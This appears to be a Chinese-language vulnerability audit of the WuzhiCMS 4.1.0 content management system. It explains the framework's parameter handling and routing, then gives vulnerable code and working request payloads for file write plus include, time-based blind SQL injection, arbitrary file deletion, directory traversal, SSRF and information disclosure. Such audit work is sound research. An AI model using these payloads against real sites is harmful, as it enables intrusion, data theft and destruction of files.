# wuzhicms（五指cms）

北京五指互联科技有限公司（简称：五指互联）开发的网站内容管理系统，下载地址：https://github.com/wuzhicms/wuzhicms

下载后解压，将`caches`和`coreframe`文件夹拷贝到`www`文件夹下，然后将`www`文件夹放到php集成环境中，重命名`www`为`wuzhicms`

安装界面：http://127.0.0.1:8089/wuzhicms/install

网站后台登陆界面：http://127.0.0.1:8089/wuzhicms/index.php?m=core&f=index&v=login&_su=wuzhicms



## 架构分析
框架的index.php为入口文件，代码如下
```
if(PHP_VERSION < '5.2.0') die('Require PHP > 5.2.0 ');
//定义当前的网站物理路径
define('WWW_ROOT',dirname(__FILE__).'/');

require './configs/web_config.php';
require COREFRAME_ROOT.'core.php';

$app = load_class('application');
$app->run();
```
主要注意三个地方：（1）`web_config.php` （2）`COREFRAME_ROOT.core.php` （3）`load_class('application')` 。(2)涉及的是如何传参 (3)则是路由如何调用

(1) `web_config.php`。其中定义了诸多常量值，如下。那么index.php中的`COREFRAME_ROOT.core.php`实际指向的就是`coreframe/core.php`文件
```php
define('COREFRAME_ROOT',substr(dirname(__FILE__),0,-11).'coreframe'.DIRECTORY_SEPARATOR);
```

(2) `coreframe/core.php`。主要定义了类加载、字符处理相关函数，其中一个函数名为`set_globals()`，会对`$_GET`和`$_POST`进行遍历，将键值对的值转换为全局变量。
```php
function set_globals() {
    if(isset($_GET)) {
        foreach ($_GET as $_key => $_value) {
            $GLOBALS[$_key] = gpc_stripslashes($_value);
        }
        $_GET = array();
    }
    if(isset($_POST)) {
        foreach ($_POST as $_key => $_value) {
            $GLOBALS[$_key] = gpc_stripslashes($_value);
        }
        $_POST = array();
    }
}
```
所以，在wuzhicms的审计过程中，可以看到很多函数中包含`$GLOBALS['a']`，这种是可以通过HTTP请求传入`a=xx`。即参数可控点。

(3) `load_class('application')`。主要用于加载class文件，如果`$static_class`变量中存在类就直接获取，否则从地址`coreframe/app/core/libs/class/$class.class.php`中获取
```php
function load_class($class, $m = 'core', $param = NULL) {
    static $static_class = array();
  
    if (isset($static_class[$class])) {
        return $static_class[$class];     //判断是否存在类，存在则直接返回
    }
    $name = FALSE;
    if (file_exists(COREFRAME_ROOT.'app/'.$m.'/libs/class/'.$class.'.class.php')) { 
        $name = 'WUZHI_'.$class;
        if (class_exists($name, FALSE) === FALSE) {
            require_once(COREFRAME_ROOT.'app/'.$m.'/libs/class/'.$class.'.class.php');
        }
    }
    ...
    $static_class[$class] = isset($param) ? new $name($param) : new $name();
    return $static_class[$class];
}
```
类名在wuzhicms中都定义为`WUZHI_$class`类。那么`load_class('application')`即加载`WUZHI_application`类，该类部分代码如下
```php
final class WUZHI_application {
    private $_m; // 模块名，取值方式：M
    private $_f; // 文件名 取值方式：F
    private $_v; // 方法名 取值方式：V
    
    private function setconfig() {
        $sn = $_SERVER["SERVER_NAME"];
        $route_config = get_config('route_config'); // $config[$filename] = include WWW_ROOT.'configs/'.$filename.'.php';
        if(isset($route_config[$sn])) {
            $route_config = $route_config[$sn];
        } else {
            $route_config = $route_config['default'];
        }...
    }
}
```
`get_config(route_config)`方法即从`www/configs/route_config.php`中读取配置，`route_config.php`内容如下
```php
return array(
	'default'=>array('m'=>'content', 'f'=>'index', 'v'=>'init'),
);
```
即调用`content`模块的`index.php`文件的`init()`方法，从目录结构中查找对应的文件，可以判断出模块即为`coreframe/app/content`。目录结构如下
```
wuzhicms-4.1.0
├─bin
├─caches
└─coreframe
    └─app
        ├─affiche
        ├─appupdate
        ├─attachement
        ├─collect
        ├─content
           ├─admin
           ├─fields
           ├─libs
           ├─city.php
           ├─...
           ├─index.php
```
也就是说，wuzhicms的coreframe下的文件路由访问形式均为：`http://ip:port/wuzhicms/index.php?m=xx&f=xx&v=xx&_su=wuzhicms`

## 4.1.0版本漏洞分析
|漏洞名称|访问路径|前台/后台|
|:---:|:---:|:---:|
|文件写入漏洞|`/wuzhicms/index.php?m=attachment&f=index&v=set&_su=wuzhicms&submit=1&setting=<%3fphp+phpinfo()%3b%3f>`|后台|
|sql注入漏洞|`/wuzhicms/index.php?m=core&f=copyfrom&v=listing&_su=wuzhicms&_menuid=&_submenuid=&keywords=1'`|后台|
|sql注入漏洞|`/wuzhicms/index.php?m=coupon&f=card&v=detail_listing&_su=wuzhicms&groupname=1'`|后台|
|sql注入漏洞|`/wuzhicms/index.php?m=member&f=group&_su=wuzhicms&v=del&groupid=1'`|后台|
|sql注入漏洞|`/wuzhicms/index.php?m=order&f=card&v=listing&_su=wuzhicms&type=1&batchid=1'`|后台|
|sql注入漏洞|`/wuzhicms/index.php?m=order&f=goods&v=listing&_su=wuzhicms&keywords=1&keytype=0&cardtype=1'`|后台|
|sql注入漏洞|`/wuzhicms/index.php?m=promote&f=index&v=search&_su=wuzhicms&fieldtype=place&keywords=1' `|后台|
|sql注入漏洞|`/wuzhicms/www/api/sms_check.php?param=1'`|前台|
|任意文件删除漏洞|`/wuzhicms/index.php?m=attachment&f=index&_su=wuzhicms&v=del&url=../z.txt`|后台|
|目录遍历漏洞|`/wuzhicms/index.php?dir=.....///.....///&m=template&f=index&v=listing&_su=wuzhicms`|后台|
|SSRF漏洞|`/wuzhicms/index.php?m=search&f=config&_su=wuzhicms&v=test&sphinxhost=xx&sphinxport=xx`|后台|
|信息泄漏漏洞|`/wuzhicms/index.php?m=core&f=index&v=phpinfo&_su=wuzhicms&_menuid=0`|前台|

### 文件写入漏洞
漏洞定位`coreframe/app/attachment/admin/index.php`的set方法
```php
public function set()
{
    if (isset($GLOBALS['submit'])) {
        set_cache(M, $GLOBALS['setting']); // 调用下方的set_cache方法
        MSG(L('operation_success'), HTTP_REFERER, 3000);
    } ...
}

function set_cache($filename, $data, $dir = '_cache_'){
	static $_dirs;
	if ($dir == '') return FALSE;
	if (!preg_match('/([a-z0-9_]+)/i', $filename)) return FALSE;
	$cache_path = CACHE_ROOT . $dir . '/';
	if (!isset($_dirs[$filename . $dir])) {
		if (!is_dir($cache_path)) {
			mkdir($cache_path, 0777, true);
		}
		$_dirs[$filename . $dir] = 1;
	}

	$filename = $cache_path . $filename . '.' . CACHE_EXT . '.php';
	if (is_array($data)) {
		$data = '<?php' . "\r\n return " . array2string($data) . '?>';
	}
	file_put_contents($filename, $data);
}
```
在架构分析的(3)注意点中提到，`$GLOBALS['xx']`是可传入的。如果传入`submit`的值不为空，就会调用`set_cache()`方法，该方法最终调用`file_put_contents($filename, $data);`，将文件内容写入到缓存文件中。此时`$data`是`$GLOBALS['setting']`的值，该值是可以通过HTTP传入的，即文件内容可控，可以写入一句话木马。但是缓存文件名是不可控的，利用思路就是，找到一个可以包含该缓存文件的地方。

`set_cache()`是写入缓存，那么相对应的就是`get_cache()`方法来获取缓存，查找该文件中是否存在`get_cache()`方法的调用，查找到两处（1）`__construct()`魔术方法 (2) `ueditor()`方法。`ueditor()`方法如下
```php
public function ueditor()
{
    if (isset($GLOBALS['submit'])) {
        $cache_in_db = cache_in_db($GLOBALS['setting'], V, M);
        set_cache(V, $GLOBALS['setting']);
        MSG(L('operation_success'), HTTP_REFERER, 3000);
    }
    else {
        $setting = get_cache(V); // 进入else需要submit为空，即不传入submit参数，调用get_cache方法，如下
        if(empty($setting)) $setting = cache_in_db('', V, M);
             include $this->template(V, M);
        }
    }
}

function get_cache($filename, $dir = '_cache_'){
	$file = get_cache_path($filename, $dir);
	if (!file_exists($file)) return '';
	$data = include $file; // 文件包含
	return $data;
}
```
那么这个漏洞的利用分为两步，（1）将恶意内容写入缓存文件（位于`/cache/_cache_/attachment.xxx.php`） （2）读取缓存文件的内容，POC如下
```
# 1 写入一句话木马到缓存文件
GET /wuzhicms/index.php?m=attachment&f=index&v=set&_su=wuzhicms&submit=1&setting=<%3fphp+phpinfo()%3b%3f>
# 2 读取缓存文件
GET /wuzhicms/index.php?m=attachment&f=index&v=ueditor&_su=wuzhicms
```

### sql注入漏洞
wuzhicms后台中有不少sql注入漏洞，其核心问题都在于`$where`变量没有做参数化/过滤，直接拼接到了sql语句中。其他的sql语句传入一般都用`intval()`限制了数据类型，或用`array('groupid' => $pid)`做了参数化处理

以其中一个sql漏洞为例做分析，其他大同小异。漏洞定位：`coreframe/app/core/admin/copyfrom.php`

```php
public function listing() {
  $siteid = get_cookie('siteid');
  $page = isset($GLOBALS['page']) ? intval($GLOBALS['page']) : 1; // 获取page值，没有的话就为1
  $page = max($page,1);
  if(isset($GLOBALS['keywords'])) { // 如果设置了keywords就用该关键字过滤数据
    $keywords = $GLOBALS['keywords'];
    $where = "`name` LIKE '%$keywords%'";
  } else {
    $where = '';
  }
  $result = $this->db->get_list('copyfrom', $where, '*', 0, 20,$page); // 从copyfrom表中获取数据
  $pages = $this->db->pages;
  $total = $this->db->number;
  include $this->template('copyfrom_listing');
}
```
`get_list()`方法首先用`$where = $this->array2sql($where);`将数组转换为sql形式，在这个过程中（1）如果传入的$where是数组，则将`%20 %27 ( ) '`这些字符转换成空；（2）如果传入的$where不是数组，则只将`%20 %27`替换为空

最终调用的都是`coreframe/app/core/libs/class/mysql.class.php`中的`get_list()`或`get_one()`方法，这两个方法核心代码相同，如下
```php
var $tablepre = 'wz_';

$sql = 'SELECT '.$field.' FROM `'.$this->tablepre.$table.'`'.$where.$group.$order.$limit;
$query = $this->query($sql);
```
总的来说，`$where`是由`keywords`参数传入的。如果keywords不是数组形式，就只对`%20 %27`替换为空，没有其他的过滤。然后执行了sql语句为`SELECT COUNT(*) AS num FROM `wz_copyfrom` WHERE `name` LIKE '%'%' LIMIT 0,1`。

拿sqlmap都能直接跑出payload，基本形式均为
```
1' AND (SELECT 1228 FROM (SELECT(SLEEP(5)))jFgw)-- JQJJ
```
其他后台sql基本形式如下
```
m=coupon&f=card&v=detail_listing&_su=wuzhicms&groupname=1' AND (SELECT 4814 FROM (SELECT(SLEEP(5)))UYWY)-- XqZC
m=member&f=group&_su=wuzhicms&v=del&groupid=1 AND 5623=BENCHMARK(5000000,MD5(0x6c4d6542))
m=order&f=card&v=listing&_su=wuzhicms&type=1&batchid=1' AND (SELECT 1228 FROM (SELECT(SLEEP(5)))jFgw)-- JQJJ
m=order&f=goods&v=listing&_su=wuzhicms&keywords=1&keytype=0&cardtype=1' AND (SELECT 1228 FROM (SELECT(SLEEP(5)))jFgw)-- JQJJ
m=promote&f=index&v=search&_su=wuzhicms&fieldtype=place&keywords=1' AND (SELECT 1228 FROM (SELECT(SLEEP(5)))jFgw)-- JQJJ
```

前台的sql注入相对简单，漏洞定位`www/api/sms_check.php`，代码如下，接收param参数，直接拼接到了sql语句中。同样用payload`param=1' AND (SELECT 8798 FROM (SELECT(SLEEP(5)))BAkg)-- DIyd
`即可盲注
```php
$code = strip_tags($GLOBALS['param']);
$posttime = SYS_TIME-300;//5分钟内有效
$db = load_class('db');
$r = $db->get_one('sms_checkcode',"`code`='$code' AND `posttime`>$posttime",'*',0,'id DESC');
```

### 任意文件删除漏洞

漏洞定位`coreframe/app/attachment/admin/index.php`的del方法，用来删除附件，获取要删除的附件的ID或URL，检查是否存在。代码如下
```php
public function del()
{
  $id = isset($GLOBALS['id']) ? $GLOBALS['id'] : '';
  $url = isset($GLOBALS['url']) ? remove_xss($GLOBALS['url']) : '';
  if (!$id && !$url) MSG(L('operation_failure'), HTTP_REFERER, 3000);
  if ($id) {
    ...
  }
  else {
    if (!$url) MSG('url del ' . L('operation_failure'), HTTP_REFERER, 3000);
    $path = str_ireplace(ATTACHMENT_URL, '', $url);
    if ($path) {
      $where = array('path' => $path);
      $att_info = $this->db->get_one('attachment', $where, 'usertimes,id'); // 从path中查询该附件

      if (empty($att_info)) {
        $this->my_unlink(ATTACHMENT_ROOT . $path); // 如果查询结果为空，删除该路径下的附件
        MSG(L('operation_success'), HTTP_REFERER, 3000);
      }
     ...
  }
}
```
如果sql查询结果为空，直接删除该路径下的$path，$path的值是通过url传入的，并且只是对xss进行了过滤，并没有过滤`../`，可以直接跨目录删除任意文件

### SSRF漏洞
漏洞定位`coreframe/app/search/admin/config.php`的test方法，调用了SSRF常用的`@fsockopen`。

```php
    public function test() {
        $sphinxhost   = remove_xss($GLOBALS['sphinxhost']);
        $sphinxport   = remove_xss($GLOBALS['sphinxport']);

        $sphinxhost = !empty($sphinxhost) ? $sphinxhost : exit('-1');
        $sphinxport = !empty($sphinxport) ? intval($sphinxport) : exit('-2');
        $fp = @fsockopen($sphinxhost, $sphinxport, $errno, $errstr , 2);
        if (!$fp) {
            exit($errno.':'.$errstr);
        } else {
            exit('1');
        }
    }
```

### 目录遍历漏洞
漏洞定位`coreframe/app/template/admin/index.php`的listing函数

```php
    public function listing() {
        $dir = $this->dir;
        $lists = glob(TPL_ROOT.$dir.'/'.'*');

        //if(!empty($lists)) rsort($lists);
        $cur_dir = str_replace(array( COREFRAME_ROOT ,DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR), array('',DIRECTORY_SEPARATOR), TPL_ROOT.$dir.'/');
        $show_dialog = 1;
        include $this->template('listing');
    }
```

`$this->template`加载listing模板，即`coreframe/app/template/admin/template/listing.tpl.php`

`.tpl.php`是一个模板文件，用来渲染显示页面，`<?php echo link_url( array('dir'=>stripslashes(dirname($dir))) );?>`生成要遍历的地址，`stripslashes()`会删除反斜杠。但是传入`.....///`会被处理成`..`来绕过有效性检查。
